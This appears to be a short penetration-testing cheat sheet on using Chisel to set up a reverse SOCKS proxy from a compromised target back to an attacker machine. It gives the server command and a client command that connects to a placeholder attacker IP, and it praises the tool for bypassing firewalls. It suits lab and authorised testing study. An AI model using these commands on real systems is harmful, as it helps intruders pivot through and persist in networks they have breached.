Chisel: Fast TCP/UDP Tunneling

A versatile, single-executable tool for advanced port forwarding and SOCKS proxying.

Why Use Chisel?

  • Single Executable: Easy deployment on target systems.
  • HTTP Transport: Bypasses many firewall restrictions.
  • Secure: Encrypted via SSH protocol.
  • Versatile: Supports reverse SOCKS, local/remote forwards.

Scenario: Reverse SOCKS Proxy

You want to establish a SOCKS proxy through a compromised target that can initiate outbound connections to your attacker machine, but SSH is not available on the target.

Key Takeaway

Chisel is an indispensable tool for flexible and robust tunneling, especially in restrictive environments.

# 1. Attacker Machine (Server)
./chisel server --reverse --port 8000
Starts a Chisel server on your machine, listening for reverse connections on port 8000.
# 2. Target Machine (Client)
./chisel client YOUR_ATTACKER_IP:8000 R:socks
The target connects back to your server, establishing a reverse SOCKS proxy (default local port 1080).
